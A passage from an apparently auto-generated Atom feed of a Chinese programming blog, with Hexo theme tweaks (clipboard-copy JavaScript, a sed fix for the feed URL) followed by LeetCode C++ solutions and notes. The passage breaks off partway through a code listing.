class="line">            <span class="comment">// rejection</span></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;fail: &quot;</span> + reason)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buttons = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;button&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; buttons.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buttons[i].<span class="title function_">getAttribute</span>(<span class="string">&quot;title&quot;</span>) == <span class="string">&quot;RSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> url = <span class="variable language_">document</span>.<span class="property">baseURI</span> + <span class="string">&quot;atom.xml&quot;</span></span><br><span class="line">            buttons[i].<span class="property">href</span> = <span class="string">&quot;javascript:;&quot;</span></span><br><span class="line">            buttons[i].<span class="property">target</span> = <span class="string">&quot;_self&quot;</span></span><br><span class="line">            buttons[i].<span class="title function_">setAttribute</span>(<span class="string">&#x27;onclick&#x27;</span>, <span class="string">&quot;copyToClipboard(\&quot;&quot;</span> + url + <span class="string">&quot;\&quot;, function() &#123; alert(\&quot;copied to clipboard\&quot;) &#125;)&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="修复插件的问题"><a href="#修复插件的问题" class="headerlink" title="修复插件的问题"></a>修复插件的问题</h3><ul><li>插件生成的xml文件中，博客的baseUrl不对，应该是<code>jingtianer.github.io</code> 它生成的是<code>github.com/jingtianer</code></li><li>生成后使用脚本替换</li></ul><blockquote><p>其实是配置文件里写错了</p></blockquote><figure class="highlight sh"><figcaption><span>deploy.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/github.com\/jingtianer/jingtianer.github.io/g&#x27;</span> public/atom.xml</span><br></pre></td></tr></table></figure><h2 id="代码块复制按钮优化"><a href="#代码块复制按钮优化" class="headerlink" title="代码块复制按钮优化"></a>代码块复制按钮优化</h2><ul><li>icarus的代码块复制按钮点击后只会选中代码，希望点击后能自动复制到剪切板</li></ul><figure class="highlight js"><figcaption><span>source/js/clickClipBoard.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyToClipboard</span>(<span class="params">text, callBack</span>) &#123;</span><br><span class="line">    navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(text).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// fulfillment</span></span><br><span class="line">            <span class="title function_">callBack</span>()</span><br><span class="line">        &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// rejection</span></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;fail: &quot;</span> + reason)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;.copy&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">copyCode</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyCode</span>(<span class="params">element</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (element <span class="keyword">instanceof</span> <span class="title class_">Element</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> elemt = element</span><br><span class="line">        <span class="keyword">while</span>(elemt.<span class="property">tagName</span> != <span class="string">&quot;FIGURE&quot;</span>) &#123;</span><br><span class="line">            elemt = elemt.<span class="property">parentElement</span></span><br><span class="line">        &#125;</span><br><span class="line">        elemt = elemt.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> text =elemt.<span class="property">innerText</span></span><br><span class="line">        </span><br><span class="line">        <span class="title function_">copyToClipboard</span>(text, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> node = $(element.<span class="property">childNodes</span>[<span class="number">0</span>])</span><br><span class="line">            node.<span class="title function_">attr</span>(<span class="string">&#x27;class&#x27;</span>, <span class="string">&quot;fa fa-check&quot;</span>)</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; </span><br><span class="line">                node.<span class="title function_">attr</span>(<span class="string">&#x27;class&#x27;</span>, <span class="string">&quot;fas fa-copy&quot;</span>)</span><br><span class="line">             &#125; ,<span class="number">1000</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hexo-pdf"><a href="#hexo-pdf" class="headerlink" title="hexo-pdf"></a>hexo-pdf</h2><ul><li><a href="https://github.com/superalsrk/hexo-pdf">地址</a></li></ul><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf ./bash_freshman.pdf %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;git-deplyer&quot;&gt;&lt;a href=&quot;#git-deplyer&quot; class=&quot;headerlink&quot; title=&quot;git deplyer&quot;&gt;&lt;/a&gt;git deplyer&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_43659725/article/details/125207584&quot;&gt;ref&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;文章目录&quot;&gt;&lt;a href=&quot;#文章目录&quot; class=&quot;headerlink&quot; title=&quot;文章目录&quot;&gt;&lt;/a&gt;文章目录&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;icarus的文章目录只有二级标题开始才可以跳转&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;阅读更多按钮&quot;&gt;&lt;a href=&quot;#阅读更多按钮&quot; class=&quot;headerlink&quot; title=&quot;阅读更多按钮&quot;&gt;&lt;/a&gt;阅读更多按钮&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;安装&lt;a href=&quot;https://github.com/chekun/hexo-excerpt&quot;&gt;hexo-excerpt&lt;/a&gt;插件&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="misc" scheme="https://jingtianer.github.io/home/categories/misc/"/>
    
    
    <category term="hexo" scheme="https://jingtianer.github.io/home/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-16</title>
    <link href="https://jingtianer.github.io/home/2022/10/25/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9316/"/>
    <id>https://jingtianer.github.io/home/2022/10/25/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9316/</id>
    <published>2022-10-25T10:14:34.000Z</published>
    <updated>2022-11-07T06:44:51.320Z</updated>
    
    <content type="html"><![CDATA[<h2 id="934-最短的桥"><a href="#934-最短的桥" class="headerlink" title="934. 最短的桥"></a><a href="https://leetcode.cn/problems/shortest-bridge/">934. 最短的桥</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> indexMap[<span class="number">105</span>][<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//岛屿点，对应一个岛</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> edgex[<span class="number">105</span>*<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> edgey[<span class="number">105</span>*<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> edgei[<span class="number">105</span>*<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> edgej[<span class="number">105</span>*<span class="number">105</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> edgecount = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> edgeicount = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestBridge</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        n = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> islandCount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> p1x,p1y;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="number">1</span> &amp;&amp; indexMap[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    ++islandCount;</span><br><span class="line">                    <span class="built_in">dfs</span>(grid, i, j, islandCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> min=INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edgecount; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; edgeicount; j++) &#123;</span><br><span class="line">                <span class="type">int</span> path = <span class="built_in">abs</span>(edgex[i]-edgei[j]) + <span class="built_in">abs</span>(edgey[i] - edgej[j]) - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(min &gt;= path) &#123;</span><br><span class="line">                    min = path;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">0</span> || y &lt; <span class="number">0</span> || x &gt;= n || y &gt;= n) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(indexMap[x][y] != <span class="number">0</span> || grid[x][y] != <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        indexMap[x][y] = index;</span><br><span class="line">        <span class="type">bool</span> flag = (y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[x][y<span class="number">-1</span>] == <span class="number">0</span>) || (y+<span class="number">1</span> &lt; n &amp;&amp; grid[x][y+<span class="number">1</span>] == <span class="number">0</span>) || (x+<span class="number">1</span> &lt; n &amp;&amp; grid[x+<span class="number">1</span>][y] == <span class="number">0</span>) || (x<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[x<span class="number">-1</span>][y] == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">dfs</span>(grid, x, y<span class="number">-1</span>, index);</span><br><span class="line">        <span class="built_in">dfs</span>(grid, x, y+<span class="number">1</span>, index);</span><br><span class="line">        <span class="built_in">dfs</span>(grid, x+<span class="number">1</span>, y, index);</span><br><span class="line">        <span class="built_in">dfs</span>(grid, x<span class="number">-1</span>, y, index);</span><br><span class="line">        <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">            <span class="keyword">if</span>(indexMap[x][y]==<span class="number">1</span>) &#123;</span><br><span class="line">                edgex[edgecount]=x;</span><br><span class="line">                edgey[edgecount]=y;</span><br><span class="line">                edgecount++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(indexMap[x][y]==<span class="number">2</span>) &#123;</span><br><span class="line">                edgei[edgeicount]=x;</span><br><span class="line">                edgej[edgeicount]=y;</span><br><span class="line">                edgeicount++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>和之前写的一道题有点像，<a href="https://leetcode.cn/problems/making-a-large-island/">827. 最大人工岛</a><br><code>827. 最大人工岛</code>我先dfs找到所有连通子图和包围岛的0点，然后找这些点中有无同时包围多个岛的，把他们的面积加起来取最大值</p></blockquote><blockquote><p>这道题也可以使用相同的方法，找到每个岛屿的边界点，然后计算边界点的距离(只有两个岛，两个岛之间肯定是可以连通的，且不管使用那条途径，最短距离一定是 $ abs(x_1 - x_2) + abs(y_1-y_2)-1 $)</p></blockquote><h3 id="看答案"><a href="#看答案" class="headerlink" title="看答案"></a>看答案</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; &amp;qu)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || y &lt; <span class="number">0</span> || x &gt;= grid.<span class="built_in">size</span>() || y &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[x][y] != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(x, y);</span><br><span class="line">        grid[x][y] = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(x - <span class="number">1</span>, y, grid, qu);</span><br><span class="line">        <span class="built_in">dfs</span>(x + <span class="number">1</span>, y, grid, qu);</span><br><span class="line">        <span class="built_in">dfs</span>(x, y - <span class="number">1</span>, grid, qu);</span><br><span class="line">        <span class="built_in">dfs</span>(x, y + <span class="number">1</span>, grid, qu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestBridge</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dirs = &#123;&#123;<span class="number">-1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; qu;</span><br><span class="line">                    <span class="built_in">dfs</span>(i, j, grid, qu);</span><br><span class="line">                    <span class="type">int</span> step = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        <span class="type">int</span> sz = qu.<span class="built_in">size</span>();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                            <span class="keyword">auto</span> [x, y] = qu.<span class="built_in">front</span>();</span><br><span class="line">                            qu.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                                <span class="type">int</span> nx = x + dirs[k][<span class="number">0</span>];</span><br><span class="line">                                <span class="type">int</span> ny = y + dirs[k][<span class="number">1</span>];</span><br><span class="line">                                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; nx &lt; n &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (grid[nx][ny] == <span class="number">0</span>) &#123;</span><br><span class="line">                                        qu.<span class="built_in">emplace</span>(nx, ny);</span><br><span class="line">                                        grid[nx][ny] = <span class="number">-1</span>;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (grid[nx][ny] == <span class="number">1</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> step;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        step++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>对于一个为1的点，先dfs吧所有在同一个岛屿内的1放入队列q中<br>对于队列中的每个节点，把包围他们的0入队，反复操作，直到遇到1<br>也就是在岛屿附近画圈，遇到1对应的圈数就是结果。</p></blockquote><h2 id="915-分割数组"><a href="#915-分割数组" class="headerlink" title="915. 分割数组"></a><a href="https://leetcode.cn/problems/partition-array-into-disjoint-intervals/">915. 分割数组</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partitionDisjoint</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">max</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        max[<span class="number">0</span>] = INT_MIN;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">min</span><span class="params">(n)</span></span>;</span><br><span class="line">        min[n<span class="number">-1</span>] = nums[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; max[i]) &#123;</span><br><span class="line">                max[i+<span class="number">1</span>] = nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max[i+<span class="number">1</span>] = max[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; min[i+<span class="number">1</span>]) &#123;</span><br><span class="line">                min[i] = nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                min[i] = min[i+<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(max[i] &lt;= min[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>没想到会这么慢</p></blockquote><h3 id="优化1"><a href="#优化1" class="headerlink" title="优化1"></a>优化1</h3><ul><li>max数组没必要</li><li>不用vector</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partitionDisjoint</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> min[<span class="number">100005</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        min[n<span class="number">-1</span>] = nums[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; min[i+<span class="number">1</span>]) &#123;</span><br><span class="line">                min[i] = nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                min[i] = min[i+<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> max = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(max &lt;= min[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(max &lt; nums[i]) &#123;</span><br><span class="line">                max = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1768-交替合并字符串"><a href="#1768-交替合并字符串" class="headerlink" title="1768. 交替合并字符串"></a><a href="https://leetcode.cn/problems/merge-strings-alternately/">1768. 交替合并字符串</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">mergeAlternately</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        string ret;</span><br><span class="line">        <span class="type">int</span> len1 = word1.<span class="built_in">size</span>(), len2 = word2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; len1 &amp;&amp; i &lt; len2; i++) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(word1[i]);</span><br><span class="line">            ret.<span class="built_in">push_back</span>(word2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(len1 &lt; len2) &#123;</span><br><span class="line">            <span class="keyword">for</span>(; i &lt; len2; i++) &#123;</span><br><span class="line">                ret.<span class="built_in">push_back</span>(word2[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(; i &lt; len1; i++) &#123;</span><br><span class="line">                ret.<span class="built_in">push_back</span>(word1[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1235-规划兼职工作"><a href="#1235-规划兼职工作" class="headerlink" title="1235. 规划兼职工作"></a><a href="https://leetcode.cn/problems/maximum-profit-in-job-scheduling/">1235. 规划兼职工作</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 